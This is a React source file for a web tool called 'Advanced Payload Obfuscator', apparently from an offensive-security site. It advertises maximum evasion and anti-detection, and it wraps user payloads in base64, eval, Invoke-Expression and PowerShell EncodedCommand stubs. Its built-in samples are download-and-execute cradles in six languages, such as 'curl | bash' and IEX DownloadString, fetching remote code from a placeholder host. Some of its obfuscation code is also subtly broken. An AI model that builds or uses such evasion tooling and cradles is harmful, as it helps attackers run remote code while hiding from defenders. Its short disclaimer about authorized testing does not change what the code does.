
import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import Layout from '../components/layout/Layout';
import { FileCode, Copy, Check, FileDown, Code, Terminal } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const PayloadObfuscator = () => {
  const { toast } = useToast();
  const [payloadType, setPayloadType] = useState('powershell');
  const [inputText, setInputText] = useState('');
  const [outputText, setOutputText] = useState('');
  const [obfuscationLevel, setObfuscationLevel] = useState('medium');
  const [obfuscationTechniques, setObfuscationTechniques] = useState<string[]>(['string-encoding', 'variable-obfuscation']);
  const [copied, setCopied] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const payloadTypes = [
    { id: 'powershell', name: 'PowerShell' },
    { id: 'python', name: 'Python' },
    { id: 'javascript', name: 'JavaScript' },
    { id: 'bash', name: 'Bash' },
    { id: 'batch', name: 'Windows Batch' },
    { id: 'csharp', name: 'C#' }
  ];
  
  const techniques = [
    { id: 'string-encoding', name: 'String Encoding' },
    { id: 'variable-obfuscation', name: 'Variable Obfuscation' },
    { id: 'flow-control', name: 'Control Flow Obfuscation' },
    { id: 'anti-analysis', name: 'Anti-Analysis Tricks' },
    { id: 'dead-code', name: 'Dead Code Insertion' }
  ];
  
  const handleObfuscate = () => {
    if (!inputText.trim()) {
      toast({
        title: "Error",
        description: "Please enter a payload to obfuscate",
        variant: "destructive"
      });
      return;
    }
    
    setIsProcessing(true);
    
    // Simulate processing delay
    setTimeout(() => {
      let result = '';
      
      // Simple demonstration obfuscation based on payload type
      if (payloadType === 'powershell') {
        result = obfuscatePowershell(inputText, obfuscationTechniques, obfuscationLevel);
      } else if (payloadType === 'python') {
        result = obfuscatePython(inputText, obfuscationTechniques, obfuscationLevel);
      } else if (payloadType === 'javascript') {
        result = obfuscateJavaScript(inputText, obfuscationTechniques, obfuscationLevel);
      } else if (payloadType === 'bash') {
        result = obfuscateBash(inputText, obfuscationTechniques, obfuscationLevel);
      } else if (payloadType === 'batch') {
        result = obfuscateBatch(inputText, obfuscationTechniques, obfuscationLevel);
      } else if (payloadType === 'csharp') {
        result = obfuscateCSharp(inputText, obfuscationTechniques, obfuscationLevel);
      }
      
      setOutputText(result);
      setIsProcessing(false);
      
      toast({
        title: "Success",
        description: "Payload obfuscated successfully"
      });
    }, 1500);
  };
  
  const handleCopy = () => {
    navigator.clipboard.writeText(outputText).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
      
      toast({
        title: "Copied",
        description: "Obfuscated payload copied to clipboard"
      });
    });
  };
  
  const handleDownload = () => {
    const blob = new Blob([outputText], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `obfuscated-payload-${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    toast({
      title: "Downloaded",
      description: "Obfuscated payload saved to file"
    });
  };

  const toggleTechnique = (technique: string) => {
    if (obfuscationTechniques.includes(technique)) {
      setObfuscationTechniques(obfuscationTechniques.filter(t => t !== technique));
    } else {
      setObfuscationTechniques([...obfuscationTechniques, technique]);
    }
  };

  const generateSampleCode = () => {
    let sample = '';
    
    switch(payloadType) {
      case 'powershell':
        sample = '$client = New-Object System.Net.WebClient\n$client.DownloadString("http://example.com/payload")';
        break;
      case 'python':
        sample = 'import requests\nresponse = requests.get("http://example.com/payload")\nexec(response.text)';
        break;
      case 'javascript':
        sample = 'fetch("http://example.com/payload")\n  .then(response => response.text())\n  .then(data => eval(data))';
        break;
      case 'bash':
        sample = 'curl -s http://example.com/payload | bash';
        break;
      case 'batch':
        sample = '@echo off\npowershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload\')"';
        break;
      case 'csharp':
        sample = 'using System.Net;\nWebClient client = new WebClient();\nstring code = client.DownloadString("http://example.com/payload");\n';
        break;
    }
    
    setInputText(sample);
  };

  return (
    <Layout>
      <div className="max-w-6xl mx-auto">
        <header className="text-center mb-8">
          <div className="flex items-center justify-center gap-3">
            <FileCode size={32} className="text-cyber-neon-green" />
            <h1 className="text-4xl font-bold text-cyber-neon-green">Advanced Payload Obfuscator</h1>
          </div>
          <p className="text-cyber-text/80 mt-3 max-w-2xl mx-auto">
            Multi-format payload obfuscator with advanced evasion techniques for various executable formats and script types.
          </p>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-8">
          <div className="lg:col-span-3">
            <div className="cyber-container mb-8">
              <h3 className="text-xl font-bold text-cyber-neon-green mb-4">1. Configure Obfuscation</h3>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6 mb-6">
                <div>
                  <label className="block text-cyber-neon-blue mb-2">Payload Type</label>
                  <select 
                    value={payloadType}
                    onChange={(e) => setPayloadType(e.target.value)}
                    className="cyber-input w-full"
                  >
                    {payloadTypes.map(type => (
                      <option key={type.id} value={type.id}>{type.name}</option>
                    ))}
                  </select>
                </div>
                
                <div>
                  <label className="block text-cyber-neon-blue mb-2">Obfuscation Level</label>
                  <select 
                    value={obfuscationLevel}
                    onChange={(e) => setObfuscationLevel(e.target.value)}
                    className="cyber-input w-full"
                  >
                    <option value="light">Light - Better Compatibility</option>
                    <option value="medium">Medium - Balanced</option>
                    <option value="heavy">Heavy - Maximum Evasion</option>
                  </select>
                </div>
              </div>
              
              <div className="mb-6">
                <label className="block text-cyber-neon-blue mb-2">Obfuscation Techniques</label>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                  {techniques.map(technique => (
                    <div key={technique.id} className="flex items-center">
                      <input 
                        type="checkbox" 
                        id={technique.id}
                        checked={obfuscationTechniques.includes(technique.id)}
                        onChange={() => toggleTechnique(technique.id)}
                        className="mr-2 h-4 w-4 border rounded text-cyber-neon-green focus:ring-cyber-neon-green"
                      />
                      <label htmlFor={technique.id} className="text-cyber-text">{technique.name}</label>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div className="cyber-container mb-8">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-cyber-neon-green">2. Input Payload</h3>
                <button 
                  onClick={generateSampleCode}
                  className="bg-cyber-dark px-3 py-1 text-sm rounded border border-cyber-neon-green/50 text-cyber-neon-green hover:bg-cyber-neon-green/10"
                >
                  Load Sample
                </button>
              </div>
              <textarea 
                className="cyber-input w-full h-60 font-mono"
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder={`Enter your ${payloadTypes.find(t => t.id === payloadType)?.name || 'code'} payload here...`}
              ></textarea>
            </div>
            
            <div className="flex justify-center mb-8">
              <button 
                className={`cyber-button text-lg flex items-center gap-2 ${isProcessing ? 'opacity-75 cursor-not-allowed' : ''}`}
                onClick={handleObfuscate}
                disabled={isProcessing || !inputText.trim()}
              >
                {isProcessing ? (
                  <>
                    <div className="animate-spin h-4 w-4 border-2 border-cyber-neon-green border-t-transparent rounded-full"></div>
                    <span>Processing...</span>
                  </>
                ) : (
                  <>
                    <Code size={18} />
                    <span>Obfuscate Payload</span>
                  </>
                )}
              </button>
            </div>
            
            <div className="cyber-container">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl font-bold text-cyber-neon-green">3. Obfuscated Result</h3>
                <div className="flex gap-2">
                  <button 
                    onClick={handleCopy}
                    disabled={!outputText}
                    className={`p-2 rounded border ${!outputText ? 'border-cyber-text/30 text-cyber-text/30 cursor-not-allowed' : 'border-cyber-neon-green/50 text-cyber-neon-green hover:bg-cyber-neon-green/10'}`}
                    title="Copy to clipboard"
                  >
                    {copied ? <Check size={18} /> : <Copy size={18} />}
                  </button>
                  <button 
                    onClick={handleDownload}
                    disabled={!outputText}
                    className={`p-2 rounded border ${!outputText ? 'border-cyber-text/30 text-cyber-text/30 cursor-not-allowed' : 'border-cyber-neon-green/50 text-cyber-neon-green hover:bg-cyber-neon-green/10'}`}
                    title="Download as file"
                  >
                    <FileDown size={18} />
                  </button>
                </div>
              </div>
              <div className="terminal-output h-60 overflow-auto">
                {outputText || 'Obfuscated output will appear here...'}
              </div>
            </div>
          </div>
          
          <div className="lg:col-span-1">
            <div className="cyber-container sticky top-20">
              <h3 className="text-xl font-bold text-cyber-neon-green mb-4">Tool Information</h3>
              
              <div className="space-y-4">
                <div>
                  <h4 className="text-cyber-neon-blue text-sm font-semibold mb-1">Supported Formats</h4>
                  <ul className="text-cyber-text/80 text-sm space-y-1">
                    {payloadTypes.map(type => (
                      <li key={type.id}>{type.name}</li>
                    ))}
                  </ul>
                </div>
                
                <div>
                  <h4 className="text-cyber-neon-blue text-sm font-semibold mb-1">Key Features</h4>
                  <ul className="text-cyber-text/80 text-sm list-disc list-inside space-y-1">
                    <li>Multiple encoding algorithms</li>
                    <li>Format-specific techniques</li>
                    <li>Anti-detection mechanisms</li>
                    <li>Custom payload generation</li>
                    <li>Cross-platform support</li>
                  </ul>
                </div>
                
                <div>
                  <h4 className="text-cyber-neon-blue text-sm font-semibold mb-1">Resources</h4>
                  <ul className="space-y-2">
                    <li>
                      <Link to="/blog/payload-obfuscator-development" className="text-cyber-neon-green hover:text-cyber-neon-blue text-sm flex items-center gap-1">
                        <Terminal size={14} />
                        <span>Development Blog</span>
                      </Link>
                    </li>
                    <li>
                      <a href="https://github.com/JxRogue/darknode" target="_blank" rel="noopener noreferrer" className="text-cyber-neon-green hover:text-cyber-neon-blue text-sm flex items-center gap-1">
                        <Code size={14} />
                        <span>GitHub Repository</span>
                      </a>
                    </li>
                  </ul>
                </div>
                
                <div className="border-t border-cyber-neon-green/20 pt-4 mt-4">
                  <p className="text-xs text-cyber-text/60">
                    This tool is intended for security professionals and ethical hackers. Only use for authorized security testing.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
};

// Obfuscation implementations for different languages
function obfuscatePowershell(input: string, techniques: string[], level: string): string {
  // This is a simplified demonstration
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `# String encoding applied\n$EncodedText = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@"\n${input}\n"@))\n$Command = "powershell -EncodedCommand $EncodedText"`;
  }
  
  if (techniques.includes('variable-obfuscation')) {
    output = output.replace(/\$([a-zA-Z0-9_]+)/g, (match, varName) => {
      const obfuscatedName = Array.from(
        { length: 8 },
        () => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)]
      ).join('');
      return `$${obfuscatedName}`;
    });
  }
  
  if (level === 'heavy') {
    output = `# Heavy obfuscation\n$k = @'\n${output}\n'@\nInvoke-Expression $k`;
  }
  
  return output;
}

function obfuscatePython(input: string, techniques: string[], level: string): string {
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `# String encoding applied\nimport base64\nexec(base64.b64decode("${Buffer.from(input).toString('base64')}".encode('utf-8')).decode('utf-8'))`;
  }
  
  if (level === 'heavy') {
    output = `# Heavy obfuscation\nimport marshal, types\nexec(marshal.loads(${Buffer.from(input).toString('base64')}))`;
  }
  
  return output;
}

function obfuscateJavaScript(input: string, techniques: string[], level: string): string {
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `// String encoding applied\neval(atob("${Buffer.from(input).toString('base64')}"))`;
  }
  
  if (level === 'heavy') {
    output = `// Heavy obfuscation\n(() => { const x = atob("${Buffer.from(input).toString('base64')}"); return eval(x); })()`;
  }
  
  return output;
}

function obfuscateBash(input: string, techniques: string[], level: string): string {
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `# String encoding applied\neval "$(echo "${Buffer.from(input).toString('base64')}" | base64 -d)"`;
  }
  
  if (level === 'heavy') {
    output = `# Heavy obfuscation\nfunction x() { eval "$(echo "${Buffer.from(input).toString('base64')}" | base64 -d)"; }; x`;
  }
  
  return output;
}

function obfuscateBatch(input: string, techniques: string[], level: string): string {
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `@echo off\r\nrem String encoding applied\r\npowershell -e "${Buffer.from(input, 'utf16le').toString('base64')}"`;
  }
  
  return output;
}

function obfuscateCSharp(input: string, techniques: string[], level: string): string {
  let output = input;
  
  if (techniques.includes('string-encoding')) {
    output = `// String encoding applied\nstring encoded = "${Buffer.from(input).toString('base64')}";\nbyte[] data = Convert.FromBase64String(encoded);\nstring decoded = Encoding.UTF8.GetString(data);\n// Execute the decoded string`;
  }
  
  return output;
}

export default PayloadObfuscator;
